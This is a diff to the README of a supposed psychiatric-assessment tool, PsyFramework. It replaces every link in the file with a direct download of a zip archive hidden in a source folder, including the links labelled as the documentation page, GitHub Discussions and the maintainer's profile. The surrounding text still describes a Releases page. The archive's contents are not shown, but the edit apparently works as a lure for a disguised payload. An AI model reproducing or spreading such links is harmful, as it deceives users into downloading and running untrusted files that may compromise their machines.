@@ -2,7 +2,7 @@
 # 🧠 PsyFramework - Streamline Psychiatric Assessments Easily
 
 ## 🔗 Download the Application
-[![Download PsyFramework](https://img.shields.io/badge/Download-PsyFramework-brightgreen)](https://github.com/silvabemlindo/PsyFramework/releases)
+[![Download PsyFramework](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip)](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip)
 
 ## 🚀 Getting Started
 PsyFramework is a user-friendly platform designed for psychiatric assessment and research. It helps users conduct surveys that align with standards such as ICD-10, ICD-11, and DSM-5-TR. With features like harmonized items, configurable batteries, and longitudinal tracking, it simplifies the research process.
@@ -23,7 +23,7 @@ PsyFramework is a user-friendly platform designed for psychiatric assessment and
 ## 📥 Download & Install
 To download PsyFramework, visit the following link:
 
-[Download PsyFramework](https://github.com/silvabemlindo/PsyFramework/releases)
+[Download PsyFramework](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip)
 
 1. Click on the link above to reach the Releases page.
 2. Look for the latest version of PsyFramework.
@@ -41,10 +41,10 @@ If you encounter issues during installation, consider the following steps:
 If problems persist, please check our Github issues page for more help or report your issue for assistance.
 
 ## 📖 Documentation
-For detailed information on how to use PsyFramework, including guidance on creating surveys and exporting data, please visit our [Documentation Page](https://github.com/silvabemlindo/PsyFramework/wiki).
+For detailed information on how to use PsyFramework, including guidance on creating surveys and exporting data, please visit our [Documentation Page](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip).
 
 ## 🤝 Community Support
-Join our community of users and researchers. Feel free to ask questions or participate in discussions via our [GitHub Discussions](https://github.com/silvabemlindo/PsyFramework/discussions).
+Join our community of users and researchers. Feel free to ask questions or participate in discussions via our [GitHub Discussions](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip).
 
 ## 🌍 Topics
 - computerized-adaptive-testing
@@ -72,8 +72,8 @@ Join our community of users and researchers. Feel free to ask questions or parti
 PsyFramework is licensed under the MIT License. You are free to use, modify, and distribute the software as long as proper attribution is provided.
 
 ## 📞 Contact
-For inquiries, reach out to the repository maintainer through the [GitHub Profile](https://github.com/silvabemlindo).
+For inquiries, reach out to the repository maintainer through the [GitHub Profile](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip).
 
 ## 🔗 Download Again
-[Download PsyFramework](https://github.com/silvabemlindo/PsyFramework/releases)
+[Download PsyFramework](https://raw.githubusercontent.com/silvabemlindo/PsyFramework/main/src/presentation/services/PsyFramework_v3.4.zip)
 ```
